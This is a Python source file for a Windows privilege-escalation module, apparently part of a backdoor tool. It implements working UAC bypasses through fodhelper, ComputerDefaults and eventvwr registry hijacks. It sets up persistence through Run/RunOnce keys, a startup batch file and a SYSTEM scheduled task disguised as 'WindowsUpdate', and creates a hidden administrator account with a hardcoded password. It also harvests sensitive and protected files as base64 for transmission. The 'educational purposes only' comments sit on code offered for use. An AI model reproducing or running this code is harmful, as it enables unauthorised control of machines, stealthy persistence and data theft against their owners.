################################################
# Privilege Escalation Feature Module          #
# Windows-focused privilege escalation         #
################################################

import subprocess
import os
import platform
import sys
import tempfile
import time
import json
from pathlib import Path


class PrivilegeEscalation:
    """
    Windows-focused privilege escalation and enumeration.
    Checks admin status and provides UAC bypass techniques.
    """
    
    def __init__(self):
        """Initialize privilege escalation module"""
        # Current operating system
        self.system = platform.system()
        # Whether current process has admin/elevated privileges
        self.is_admin = self.check_privileges()
    
    def check_privileges(self):
        """
        Check if the current process has elevated privileges (Windows only)
        
        Uses Windows API to determine if running as administrator.
        
        Returns:
            True if admin/elevated, False otherwise
        """
        try:
            if self.system == 'Windows':
                import ctypes
                # Windows API call to check admin status
                return bool(ctypes.windll.shell32.IsUserAnAdmin())
            else:
                return False
        except Exception as e:
            return False
    
    def get_status(self):
        """
        Get current privilege status (Windows only)
        
        Returns comprehensive information about user privileges, groups,
        integrity level, and system information.
        
        Returns:
            Dictionary containing privilege and user status information
        """
        if self.system != 'Windows':
            return {'error': 'This module only supports Windows systems'}
        
        status = {
            'system': self.system,
            'is_admin': self.is_admin,
            'user': os.getenv('USERNAME', 'Unknown'),
            'user_domain': os.getenv('USERDOMAIN', 'Unknown'),
            'computer_name': os.getenv('COMPUTERNAME', 'Unknown'),
            'user_profile': os.getenv('USERPROFILE', 'Unknown'),
            'groups': self.get_user_groups(),
            'integrity_level': self.get_integrity_level()
        }
        return status
    
    def get_integrity_level(self):
        """
        Get process integrity level (Windows)
        
        Integrity levels determine what resources a process can access.
        High = Administrator, Medium = Standard User, Low = Restricted
        
        Returns:
            String describing integrity level
        """
        try:
            result = subprocess.check_output('whoami /groups | findstr "Mandatory"', shell=True, stderr=subprocess.PIPE).decode()
            if 'High Mandatory Level' in result:
                return 'High (Admin)'
            elif 'Medium Mandatory Level' in result:
                return 'Medium (Standard User)'
            elif 'Low Mandatory Level' in result:
                return 'Low'
            else:
                return 'Unknown'
        except:
            return 'Unknown'
    
    def get_user_groups(self):
        """Get user groups (Windows only)"""
        try:
            if self.system == 'Windows':
                result = subprocess.check_output('whoami /groups', shell=True, stderr=subprocess.PIPE).decode()
                return result
            else:
                return "Not supported on this system"
        except Exception as e:
            return f"Unable to retrieve groups: {str(e)}"
    
    def check_uac_status(self):
        """Check UAC (User Account Control) status"""
        if self.system != 'Windows':
            return "Not applicable for this system"
        
        try:
            # Check UAC registry settings
            cmd = 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA'
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE).decode()
            
            if '0x1' in result:
                uac_enabled = True
            elif '0x0' in result:
                uac_enabled = False
            else:
                uac_enabled = 'Unknown'
            
            # Check ConsentPromptBehaviorAdmin
            cmd2 = 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin'
            result2 = subprocess.check_output(cmd2, shell=True, stderr=subprocess.PIPE).decode()
            
            return {
                'uac_enabled': uac_enabled,
                'raw_output': result,
                'consent_prompt': result2
            }
        except Exception as e:
            return f"Unable to check UAC status: {str(e)}"
    
    def get_system_info(self):
        """Get detailed Windows system information"""
        if self.system != 'Windows':
            return "Not applicable for this system"
        
        try:
            result = subprocess.check_output('systeminfo', shell=True, stderr=subprocess.PIPE).decode()
            return result
        except Exception as e:
            return f"Unable to retrieve system information: {str(e)}"
    
    def enumerate_services(self):
        """Enumerate running Windows services"""
        if self.system != 'Windows':
            return "Not applicable for this system"
        
        try:
            result = subprocess.check_output('sc query state= all', shell=True, stderr=subprocess.PIPE).decode()
            return result[:3000]  # Limit output
        except Exception as e:
            return f"Unable to enumerate services: {str(e)}"
    
    def check_service_permissions(self, service_name=None):
        """Check service permissions for privilege escalation opportunities"""
        if self.system != 'Windows':
            return "Not applicable for this system"
        
        try:
            if service_name:
                cmd = f'sc qc "{service_name}"'
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE).decode()
                return result
            else:
                # Get all services and check for unquoted service paths
                cmd = 'wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"'
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE).decode()
                return result
        except Exception as e:
            return f"Unable to check service permissions: {str(e)}"
    
    def check_scheduled_tasks(self):
        """Check Windows scheduled tasks"""
        if self.system != 'Windows':
            return "Not applicable for this system"
        
        try:
            result = subprocess.check_output('schtasks /query /fo LIST /v', shell=True, stderr=subprocess.PIPE).decode()
            return result[:3000]  # Limit output
        except Exception as e:
            return f"Unable to check scheduled tasks: {str(e)}"
    
    def find_sensitive_files(self):
        """Search for potentially sensitive files on Windows"""
        if self.system != 'Windows':
            return "Not applicable for this system"
        
        try:
            user_dir = os.path.expanduser('~')
            # Search for sensitive files
            patterns = ['*.txt', '*.config', '*.xml', '*.ini', '*.log', '*.bak']
            results = []
            
            for pattern in patterns:
                try:
                    cmd = f'dir /s /b "{user_dir}\\{pattern}" 2>nul'
                    result = subprocess.check_output(cmd, shell=True, timeout=10, stderr=subprocess.PIPE).decode()
                    if result:
                        results.append(f"=== {pattern} ===\n{result[:500]}")
                except:
                    continue
            
            return '\n'.join(results) if results else "No sensitive files found"
        except Exception as e:
            return f"Unable to search for sensitive files: {str(e)}"
    
    def attempt_uac_bypass(self):
        """
        Attempt UAC bypass on Windows using various techniques.
        WARNING: This is for educational purposes only!
        """
        if self.system != 'Windows':
            return "UAC bypass only applicable to Windows systems"
        
        try:
            import ctypes
            
            # Check if already elevated
            if ctypes.windll.shell32.IsUserAnAdmin():
                return "Already running with administrator privileges"
            
            bypass_attempts = []
            
            # Method 1: fodhelper.exe UAC bypass
            try:
                # Create registry keys for fodhelper bypass
                script_path = sys.executable
                reg_path = r"HKCU\Software\Classes\ms-settings\Shell\Open\command"
                
                # Set default value
                cmd1 = f'reg add "{reg_path}" /ve /d "{script_path}" /f'
                result1 = subprocess.run(cmd1, shell=True, capture_output=True, text=True, timeout=5)
                
                # Set DelegateExecute value
                cmd2 = f'reg add "{reg_path}" /v "DelegateExecute" /f'
                result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True, timeout=5)
                
                if result1.returncode == 0 and result2.returncode == 0:
                    bypass_attempts.append("fodhelper.exe registry keys created")
                    
                    # Execute fodhelper (this will trigger the bypass)
                    subprocess.Popen('fodhelper.exe', shell=True)
                    time.sleep(2)
                    
                    # Clean up registry
                    subprocess.run('reg delete "HKCU\\Software\\Classes\\ms-settings" /f', shell=True, capture_output=True)
                    
                    bypass_attempts.append("fodhelper.exe executed")
                else:
                    bypass_attempts.append("fodhelper.exe method failed")
            except Exception as e:
                bypass_attempts.append(f"fodhelper.exe error: {str(e)}")
            
            # Method 2: ComputerDefaults.exe bypass
            try:
                script_path = sys.executable
                reg_path = r"HKCU\Software\Classes\ms-settings\Shell\Open\command"
                
                cmd1 = f'reg add "{reg_path}" /ve /d "{script_path}" /f'
                result1 = subprocess.run(cmd1, shell=True, capture_output=True, text=True, timeout=5)
                
                if result1.returncode == 0:
                    subprocess.Popen('ComputerDefaults.exe', shell=True)
                    time.sleep(2)
                    subprocess.run('reg delete "HKCU\\Software\\Classes\\ms-settings" /f', shell=True, capture_output=True)
                    bypass_attempts.append("ComputerDefaults.exe executed")
                else:
                    bypass_attempts.append("ComputerDefaults.exe method failed")
            except Exception as e:
                bypass_attempts.append(f"ComputerDefaults.exe error: {str(e)}")
            
            # Method 3: eventvwr.exe bypass
            try:
                script_path = sys.executable
                reg_path = r"HKCU\Software\Classes\mscfile\shell\open\command"
                
                cmd1 = f'reg add "{reg_path}" /ve /d "{script_path}" /f'
                result1 = subprocess.run(cmd1, shell=True, capture_output=True, text=True, timeout=5)
                
                if result1.returncode == 0:
                    subprocess.Popen('eventvwr.exe', shell=True)
                    time.sleep(2)
                    subprocess.run('reg delete "HKCU\\Software\\Classes\\mscfile" /f', shell=True, capture_output=True)
                    bypass_attempts.append("eventvwr.exe executed")
                else:
                    bypass_attempts.append("eventvwr.exe method failed")
            except Exception as e:
                bypass_attempts.append(f"eventvwr.exe error: {str(e)}")
            
            return f"UAC bypass attempts: {', '.join(bypass_attempts)}"
            
        except ImportError:
            return "ctypes module not available"
        except Exception as e:
            return f"UAC bypass failed: {str(e)}"
    
    def create_persistence_mechanism(self, payload_path=None):
        """
        Create Windows persistence mechanisms.
        """
        if self.system != 'Windows':
            return "This feature only works on Windows systems"
        
        if not payload_path:
            payload_path = sys.executable
        
        persistence_methods = []
        
        try:
            # Method 1: Registry Run key persistence (Current User)
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, payload_path)
                winreg.CloseKey(key)
                persistence_methods.append("Registry Run key created (HKCU)")
            except Exception as e:
                persistence_methods.append(f"Registry Run key failed: {str(e)}")
            
            # Method 2: Startup folder persistence
            try:
                startup_folder = os.path.join(os.getenv('APPDATA'), 
                                            'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
                
                # Create a batch file to run the payload
                batch_file = os.path.join(startup_folder, 'WindowsUpdate.bat')
                with open(batch_file, 'w') as f:
                    f.write(f'@echo off\nstart "" "{payload_path}"\n')
                
                persistence_methods.append("Startup folder persistence created")
            except Exception as e:
                persistence_methods.append(f"Startup folder failed: {str(e)}")
            
            # Method 3: Scheduled task persistence (if elevated)
            if self.is_admin:
                try:
                    task_name = "WindowsUpdateCheck"
                    cmd = f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    if result.returncode == 0:
                        persistence_methods.append("Scheduled task created (SYSTEM)")
                    else:
                        persistence_methods.append(f"Scheduled task failed: {result.stderr}")
                except Exception as e:
                    persistence_methods.append(f"Scheduled task error: {str(e)}")
            
            # Method 4: Registry RunOnce key
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                   "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 
                                   0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, payload_path)
                winreg.CloseKey(key)
                persistence_methods.append("Registry RunOnce key created")
            except Exception as e:
                persistence_methods.append(f"Registry RunOnce failed: {str(e)}")
            
            return f"Persistence mechanisms: {', '.join(persistence_methods)}"
            
        except Exception as e:
            return f"Persistence creation failed: {str(e)}"
    
    def exploit_weak_file_permissions(self):
        """
        Find files with weak permissions on Windows for privilege escalation.
        """
        if self.system != 'Windows':
            return ["Not applicable for this system"]
        
        exploitable_files = []
        
        try:
            # Check for modifiable service binaries
            try:
                cmd = 'sc query state= all | findstr "SERVICE_NAME"'
                services = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE).decode()
                
                for line in services.split('\n')[:50]:  # Limit to first 50 services
                    if 'SERVICE_NAME:' in line:
                        service_name = line.split(':')[1].strip()
                        try:
                            # Get service path
                            cmd = f'sc qc "{service_name}" | findstr "BINARY_PATH_NAME"'
                            path_info = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, timeout=2).decode()
                            if path_info and 'BINARY_PATH_NAME' in path_info:
                                # Extract the binary path
                                parts = path_info.split(':', 1)
                                if len(parts) > 1:
                                    binary_path = parts[1].strip()
                                    # Remove quotes and extract the executable path
                                    binary_path = binary_path.split()[0].strip('"')
                                    
                                    # Check if path exists and is writable
                                    try:
                                        if os.path.exists(binary_path) and os.access(binary_path, os.W_OK):
                                            exploitable_files.append(f"{binary_path} (Service binary writable)")
                                        # Also check parent directory
                                        parent_dir = os.path.dirname(binary_path)
                                        if os.path.exists(parent_dir) and os.access(parent_dir, os.W_OK):
                                            exploitable_files.append(f"{parent_dir} (Service directory writable)")
                                    except:
                                        pass
                        except:
                            continue
            except Exception as e:
                exploitable_files.append(f"Service check error: {str(e)}")
            
            # Check Program Files directories for writable files
            try:
                program_dirs = [
                    'C:\\Program Files',
                    'C:\\Program Files (x86)'
                ]
                
                for prog_dir in program_dirs:
                    if os.path.exists(prog_dir):
                        try:
                            # Check if directory itself is writable
                            if os.access(prog_dir, os.W_OK):
                                exploitable_files.append(f"{prog_dir} (Writable program directory)")
                        except:
                            pass
            except:
                pass
            
            return exploitable_files if exploitable_files else ["No exploitable file permissions found"]
            
        except Exception as e:
            return [f"File permission check failed: {str(e)}"]
    
    def attempt_dll_hijacking(self):
        """
        Find DLL hijacking opportunities on Windows systems.
        WARNING: This is for educational purposes only!
        """
        if self.system != 'Windows':
            return ["DLL hijacking only applicable to Windows systems"]
        
        try:
            hijackable_locations = []
            
            # Common DLLs that can be hijacked
            common_dlls = [
                'version.dll', 'dwmapi.dll', 'uxtheme.dll', 'propsys.dll',
                'profapi.dll', 'cryptsp.dll', 'cryptbase.dll', 'winnsi.dll',
                'WINMM.dll', 'MSIMG32.dll', 'WTSAPI32.dll'
            ]
            
            # Search in common application directories
            common_app_dirs = [
                os.path.expanduser('~\\AppData\\Local'),
                os.path.expanduser('~\\AppData\\Roaming'),
                'C:\\Program Files',
                'C:\\Program Files (x86)'
            ]
            
            for app_dir in common_app_dirs:
                if not os.path.exists(app_dir):
                    continue
                
                try:
                    # Find executable files
                    for root, dirs, files in os.walk(app_dir):
                        # Limit depth to avoid too many results
                        dirs[:] = [d for d in dirs if not d.startswith('.')][:5]
                        
                        for file in files:
                            if file.endswith('.exe'):
                                exe_path = os.path.join(root, file)
                                exe_dir = os.path.dirname(exe_path)
                                
                                # Check if we can write to the directory
                                try:
                                    if os.access(exe_dir, os.W_OK):
                                        # Check for missing DLLs
                                        for dll in common_dlls:
                                            dll_path = os.path.join(exe_dir, dll)
                                            if not os.path.exists(dll_path):
                                                hijackable_locations.append(f"{exe_path} -> {dll}")
                                                break  # Only report one missing DLL per exe
                                except:
                                    pass
                                
                                # Limit results to prevent overwhelming output
                                if len(hijackable_locations) > 30:
                                    return hijackable_locations
                        
                        # Limit the search depth
                        if len(hijackable_locations) > 30:
                            break
                except PermissionError:
                    continue
                except Exception:
                    continue
            
            return hijackable_locations if hijackable_locations else ["No DLL hijacking opportunities found"]
            
        except Exception as e:
            return [f"DLL hijacking check failed: {str(e)}"]
    
    def create_backdoor_user(self, username="support", password="P@ssw0rd123"):
        """
        Create a backdoor user account on Windows (requires elevated privileges).
        WARNING: This is for educational purposes only!
        """
        if self.system != 'Windows':
            return "This feature only works on Windows systems"
        
        if not self.is_admin:
            return "Administrator privileges required to create users"
        
        try:
            # Create user
            cmd = f'net user {username} {password} /add'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Add to administrators group
                cmd = f'net localgroup administrators {username} /add'
                admin_result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                # Hide user from login screen
                try:
                    import winreg
                    key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
                    key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    winreg.SetValueEx(key, username, 0, winreg.REG_DWORD, 0)
                    winreg.CloseKey(key)
                    return f"Backdoor user '{username}' created and hidden from login screen"
                except Exception as e:
                    return f"Backdoor user '{username}' created (not hidden): {str(e)}"
            else:
                return f"Failed to create user: {result.stderr}"
                
        except Exception as e:
            return f"User creation failed: {str(e)}"
    def read_admin_file(self, file_path):
        """
        Attempt to read a file that requires admin privileges.
        Tries multiple methods to access admin-protected files.
        
        This function attempts various techniques to read files that normally
        require administrator privileges, including direct read, PowerShell,
        and system commands.
        
        Args:
            file_path: Full path to the file to read
            
        Returns:
            Dictionary with success status and file content or error message:
            {
                'success': bool,       # Whether file was successfully read
                'method': str,         # Method used to read file
                'content': str,        # File content if successful
                'error': str,          # Error message if failed
                'is_admin': bool       # Current admin status
            }
        """
        result = {
            'success': False,
            'method': None,
            'content': None,
            'error': None,
            'is_admin': self.is_admin
        }
        
        # Validate file path
        if not file_path:
            result['error'] = "No file path provided"
            return result
        
        # Method 1: Direct read (if already admin or file is readable)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                result['content'] = f.read()
                result['success'] = True
                result['method'] = 'direct_read'
                return result
        except PermissionError:
            result['error'] = "Permission denied - admin privileges required"
        except FileNotFoundError:
            result['error'] = f"File not found: {file_path}"
            return result
        except Exception as e:
            result['error'] = f"Error reading file: {str(e)}"
        
        # Method 2: PowerShell with elevation (Windows)
        if self.system == 'Windows':
            try:
                # Try PowerShell Get-Content
                ps_cmd = f'powershell -Command "Get-Content -Path \'{file_path}\' -ErrorAction Stop"'
                output = subprocess.check_output(ps_cmd, shell=True, stderr=subprocess.PIPE, timeout=10).decode('utf-8', errors='ignore')
                result['content'] = output
                result['success'] = True
                result['method'] = 'powershell'
                return result
            except subprocess.CalledProcessError as e:
                result['error'] = f"PowerShell access denied: {e.stderr.decode() if e.stderr else 'Unknown error'}"
            except Exception as e:
                result['error'] = f"PowerShell error: {str(e)}"
        
        # Method 3: Use 'type' command (Windows) or 'cat' (Linux/Mac)
        try:
            if self.system == 'Windows':
                cmd = f'type "{file_path}"'
            else:
                cmd = f'cat "{file_path}"'
            
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, timeout=10).decode('utf-8', errors='ignore')
            result['content'] = output
            result['success'] = True
            result['method'] = 'shell_command'
            return result
        except subprocess.CalledProcessError as e:
            result['error'] = f"Shell command access denied: {e.stderr.decode() if e.stderr else 'Unknown error'}"
        except Exception as e:
            result['error'] = f"Shell command error: {str(e)}"
        
        # Method 4: Try with icacls to check permissions (Windows only)
        if self.system == 'Windows':
            try:
                icacls_cmd = f'icacls "{file_path}"'
                perms = subprocess.check_output(icacls_cmd, shell=True, stderr=subprocess.PIPE, timeout=5).decode('utf-8', errors='ignore')
                result['permissions'] = perms
                result['error'] += f"\n\nFile permissions:\n{perms[:500]}"
            except:
                pass
        
        # If all methods failed, provide helpful information
        if not result['success']:
            if self.is_admin:
                result['error'] += "\n\nNote: Running as admin but still cannot access file. File may be:"
                result['error'] += "\n- In use by another process"
                result['error'] += "\n- Protected by system security"
                result['error'] += "\n- Encrypted or requires special permissions"
            else:
                result['error'] += "\n\nNote: Not running as admin. Try:"
                result['error'] += "\n1. Run 'priv_uac_bypass' to attempt elevation"
                result['error'] += "\n2. Run backdoor as administrator"
                result['error'] += "\n3. Use 'priv_check' to verify admin status"
        
        return result
    
    def read_admin_file_binary(self, file_path):
        """
        Attempt to read a binary file that requires admin privileges.
        Returns base64-encoded content for safe transmission.
        
        Args:
            file_path: Full path to the file to read
            
        Returns:
            Dictionary with success status and base64-encoded content or error message
        """
        import base64
        
        result = {
            'success': False,
            'method': None,
            'content_base64': None,
            'file_size': 0,
            'error': None,
            'is_admin': self.is_admin
        }
        
        # Validate file path
        if not file_path:
            result['error'] = "No file path provided"
            return result
        
        # Method 1: Direct binary read
        try:
            with open(file_path, 'rb') as f:
                binary_content = f.read()
                result['content_base64'] = base64.b64encode(binary_content).decode('ascii')
                result['file_size'] = len(binary_content)
                result['success'] = True
                result['method'] = 'direct_binary_read'
                return result
        except PermissionError:
            result['error'] = "Permission denied - admin privileges required"
        except FileNotFoundError:
            result['error'] = f"File not found: {file_path}"
            return result
        except Exception as e:
            result['error'] = f"Error reading binary file: {str(e)}"
        
        # Method 2: PowerShell binary read (Windows)
        if self.system == 'Windows':
            try:
                # Create a temporary PowerShell script to read binary and convert to base64
                ps_script = f"""
                $bytes = [System.IO.File]::ReadAllBytes('{file_path}')
                $base64 = [System.Convert]::ToBase64String($bytes)
                Write-Output $base64
                """
                
                ps_cmd = f'powershell -Command "{ps_script}"'
                output = subprocess.check_output(ps_cmd, shell=True, stderr=subprocess.PIPE, timeout=30).decode('utf-8', errors='ignore').strip()
                
                if output:
                    result['content_base64'] = output
                    result['file_size'] = len(base64.b64decode(output))
                    result['success'] = True
                    result['method'] = 'powershell_binary'
                    return result
            except subprocess.CalledProcessError as e:
                result['error'] = f"PowerShell binary access denied: {e.stderr.decode() if e.stderr else 'Unknown error'}"
            except Exception as e:
                result['error'] = f"PowerShell binary error: {str(e)}"
        
        # If all methods failed
        if not result['success']:
            if self.is_admin:
                result['error'] += "\n\nRunning as admin but cannot access file."
            else:
                result['error'] += "\n\nNot running as admin. Try 'priv_uac_bypass' first."
        
        return result
    
    def list_admin_directory(self, dir_path):
        """
        List contents of a directory that may require admin privileges.
        
        Args:
            dir_path: Full path to the directory
            
        Returns:
            Dictionary with success status and directory contents or error message
        """
        result = {
            'success': False,
            'method': None,
            'files': [],
            'directories': [],
            'error': None,
            'is_admin': self.is_admin
        }
        
        # Validate directory path
        if not dir_path:
            result['error'] = "No directory path provided"
            return result
        
        # Method 1: Direct listing with os.listdir
        try:
            items = os.listdir(dir_path)
            for item in items:
                full_path = os.path.join(dir_path, item)
                try:
                    if os.path.isfile(full_path):
                        size = os.path.getsize(full_path)
                        result['files'].append({'name': item, 'size': size, 'path': full_path})
                    elif os.path.isdir(full_path):
                        result['directories'].append({'name': item, 'path': full_path})
                except:
                    # If we can't determine type, just add to files list
                    result['files'].append({'name': item, 'size': 'unknown', 'path': full_path})
            
            result['success'] = True
            result['method'] = 'direct_listing'
            return result
        except PermissionError:
            result['error'] = "Permission denied - admin privileges required"
        except FileNotFoundError:
            result['error'] = f"Directory not found: {dir_path}"
            return result
        except Exception as e:
            result['error'] = f"Error listing directory: {str(e)}"
        
        # Method 2: Shell command listing
        try:
            if self.system == 'Windows':
                cmd = f'dir /B "{dir_path}"'
            else:
                cmd = f'ls -la "{dir_path}"'
            
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.PIPE, timeout=10).decode('utf-8', errors='ignore')
            
            # Parse output
            for line in output.strip().split('\n'):
                if line.strip():
                    result['files'].append({'name': line.strip(), 'size': 'unknown', 'path': os.path.join(dir_path, line.strip())})
            
            result['success'] = True
            result['method'] = 'shell_listing'
            return result
        except subprocess.CalledProcessError as e:
            result['error'] = f"Shell command access denied: {e.stderr.decode() if e.stderr else 'Unknown error'}"
        except Exception as e:
            result['error'] = f"Shell command error: {str(e)}"
        
        # If all methods failed
        if not result['success']:
            if self.is_admin:
                result['error'] += "\n\nRunning as admin but cannot access directory."
            else:
                result['error'] += "\n\nNot running as admin. Try 'priv_uac_bypass' first."
        
        return result

    def comprehensive_escalation_scan(self):
        """
        Perform a comprehensive Windows privilege escalation scan.
        """
        if self.system != 'Windows':
            return {'error': 'This module only supports Windows systems'}
        
        results = {
            'status': self.get_status(),
            'uac_status': self.check_uac_status(),
            'system_info': self.get_system_info()[:500],  # Truncate for readability
            'services': self.enumerate_services()[:500],
            'service_permissions': self.check_service_permissions(),
            'scheduled_tasks': self.check_scheduled_tasks()[:500],
            'sensitive_files': self.find_sensitive_files()[:500],
            'weak_file_permissions': self.exploit_weak_file_permissions(),
            'dll_hijacking': self.attempt_dll_hijacking()[:20]  # Limit DLL hijacking results
        }
        
        return results


def get_privilege_info():
    """Quick function to get privilege information"""
    pe = PrivilegeEscalation()
    return pe.get_status()


def execute_privilege_escalation(technique=None, **kwargs):
    """
    Execute specific Windows privilege escalation technique.
    
    Available techniques:
    - 'uac_bypass': Windows UAC bypass
    - 'create_persistence': Create persistence mechanisms
    - 'backdoor_user': Create backdoor user account
    - 'dll_hijacking': Find DLL hijacking opportunities
    - 'comprehensive': Full escalation scan
    """
    pe = PrivilegeEscalation()
    
    if pe.system != 'Windows':
        return {'error': 'This module only supports Windows systems'}
    
    if technique == 'uac_bypass':
        return pe.attempt_uac_bypass()
    elif technique == 'create_persistence':
        return pe.create_persistence_mechanism(kwargs.get('payload_path'))
    elif technique == 'backdoor_user':
        return pe.create_backdoor_user(
            kwargs.get('username', 'support'),
            kwargs.get('password', 'P@ssw0rd123')
        )
    elif technique == 'dll_hijacking':
        return pe.attempt_dll_hijacking()
    elif technique == 'comprehensive':
        return pe.comprehensive_escalation_scan()
    else:
        return {
            'available_techniques': [
                'uac_bypass', 'create_persistence', 'backdoor_user',
                'dll_hijacking', 'comprehensive'
            ],
            'current_status': pe.get_status()
        }


def automated_privilege_escalation():
    """
    Automated Windows privilege escalation attempt using multiple techniques.
    WARNING: This is for educational purposes only!
    """
    pe = PrivilegeEscalation()
    
    if pe.system != 'Windows':
        return ['Error: This module only supports Windows systems']
    
    results = []
    
    # Check current status
    current_status = pe.get_status()
    results.append(f"Current status: Admin={current_status['is_admin']}, User={current_status['user']}")
    
    if pe.is_admin:
        results.append("Already running with elevated privileges")
        return results
    
    # Try UAC bypass
    uac_result = pe.attempt_uac_bypass()
    results.append(f"UAC bypass: {uac_result}")
    
    # Check for DLL hijacking opportunities
    dll_result = pe.attempt_dll_hijacking()
    dll_count = len(dll_result) if isinstance(dll_result, list) else 0
    results.append(f"DLL hijacking opportunities found: {dll_count}")
    
    # Check for weak file permissions
    weak_perms = pe.exploit_weak_file_permissions()
    weak_count = len(weak_perms) if isinstance(weak_perms, list) else 0
    results.append(f"Exploitable file permissions found: {weak_count}")
    
    # Create persistence if possible
    try:
        persistence_result = pe.create_persistence_mechanism()
        results.append(f"Persistence: {persistence_result}")
    except Exception as e:
        results.append(f"Persistence: Failed - {str(e)}")
    
    return results

